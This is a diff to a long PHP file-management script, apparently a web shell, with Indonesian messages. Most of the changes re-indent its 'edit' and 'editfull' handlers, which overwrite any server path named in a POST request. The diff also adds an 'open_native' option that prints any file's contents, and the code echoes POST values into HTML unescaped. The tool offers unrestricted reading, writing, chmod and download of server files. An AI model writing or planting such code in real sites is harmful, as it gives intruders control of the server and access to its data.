@@ -1469,39 +1469,40 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
             echo '<form method="POST">New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="rename"><input type="submit" value="Go" /></form>';
 
         }
-                elseif($_POST['opt'] == 'editfull') {
-                        if(isset($_POST['src'])){
-                     $fp = fopen($_POST['path'],'w');
-                     if(fwrite($fp,$_POST['src'])){
+        elseif($_POST['opt'] == 'editfull') {
+            if(isset($_POST['src'])){
+                $fp = fopen($_POST['path'],'w');
+                if(fwrite($fp,$_POST['src'])){
                     echo '<font color="green">Berhasil Edit File</font><br/>';
-                 }else{
-                    echo '<font color="red">Gagal Edit File</font><br/>';
-                 }
-
-                 fclose($fp);
                 }
+                else{
+                    echo '<font color="red">Gagal Edit File</font><br/>';
+                }
+
+                fclose($fp);
+            }
                         
-                        echo '<script language="javascript" type="text/javascript" src="/ai-web/editarea/edit_area_full.js"></script>';
-                        echo '<script language="javascript" type="text/javascript">';
-                        echo "editAreaLoader.init({id : 'textarea_1', toolbar: 'save,load,search,go_to_line,|,undo,redo,|, select_font, |, syntax_selection, |, change_smooth_selection, highlight, reset_highlight, |, help', syntax_selection_allow: 'css,html,js,php,python,vb,xml,c,cpp,sql,basic,pas,brainfuck',syntax:'php', start_highlight: true, save_callback:'mysave'});";
-                        echo "function mysave(id, content){  alert(content);  }";
-                        echo "</script>";
+            echo '<script language="javascript" type="text/javascript" src="/ai-web/editarea/edit_area_full.js"></script>';
+            echo '<script language="javascript" type="text/javascript">';
+            echo "editAreaLoader.init({id : 'textarea_1', toolbar: 'save,load,search,go_to_line,|,undo,redo,|, select_font, |, syntax_selection, |, change_smooth_selection, highlight, reset_highlight, |, help', syntax_selection_allow: 'css,html,js,php,python,vb,xml,c,cpp,sql,basic,pas,brainfuck',syntax:'php', start_highlight: true, save_callback:'mysave'});";
+            echo "function mysave(id, content){  alert(content);  }";
+            echo "</script>";
 
-                        echo '<form method="POST"><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="Save" /><br><textarea id="textarea_1" name="src" cols="800" rows="105">'.    htmlspecialchars(file_get_contents($_POST["path"]))  .'</textarea></form>';
-                }
-
-                elseif($_POST['opt'] == 'edit'){
-                        if(isset($_POST['src'])){
-                     $fp = fopen($_POST['path'],'w');
-                     if(fwrite($fp,$_POST['src'])){
+            echo '<form method="POST"><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="Save" /><br><textarea id="textarea_1" name="src" cols="800" rows="105">'.    htmlspecialchars(file_get_contents($_POST["path"]))  .'</textarea></form>';
+        }
+        elseif($_POST['opt'] == 'edit'){
+            if(isset($_POST['src'])){
+                $fp = fopen($_POST['path'],'w');
+                if(fwrite($fp,$_POST['src'])){
                     echo '<font color="green">Berhasil Edit File</font><br/>';
-                 }else{
-                    echo '<font color="red">Gagal Edit File</font><br/>';
-                 }
-
-                 fclose($fp);
                 }
-                        //echo("<script>location.href ='editor.php?title=".$_POST['path'].'/'.$_POST['name']."';</script>");
+                else{
+                    echo '<font color="red">Gagal Edit File</font><br/>';
+                }
+
+                fclose($fp);
+            }
+            //echo("<script>location.href ='editor.php?title=".$_POST['path'].'/'.$_POST['name']."';</script>");
             echo '<form method="POST"><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="Save"/><textarea cols=1000 rows=60 name="src" style="background:#000000;color:#30FF00">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br/></form>';
 
         }elseif($_POST['opt'] == 'download') {
@@ -1675,6 +1676,11 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
             $time = microtime(true) - $time;
 
             echo 'Time Used: ', $time;
+        }
+        elseif($_POST['opt'] == 'open_native') {
+        	$filesrc = $_POST['path'];
+            echo('<pre>'.htmlspecialchars(file_get_contents($filesrc)).'</pre>');
+        	
         }
 
         echo '</center>';
@@ -1928,11 +1934,12 @@ if(isset($_GET['path']) || isset($_GET['file_manager'])){
                 <td><center><form method="POST" action="?option&path='.$path.'">
                 <select name="opt">
                 <option value="">Select</option>
+                <option value="open_native">Open</option>
                 <option value="delete">Delete</option>
                 <option value="chmod">Chmod</option>
                 <option value="rename">Rename</option>
                 <option value="edit">Edit</option>
-                                <option value="editfull">Editfull</option>
+                <option value="editfull">Editfull</option>
                 <option value="copy">Copy</option>
                 <option value="move">Move</option>
                 <option value="download">Download</option>
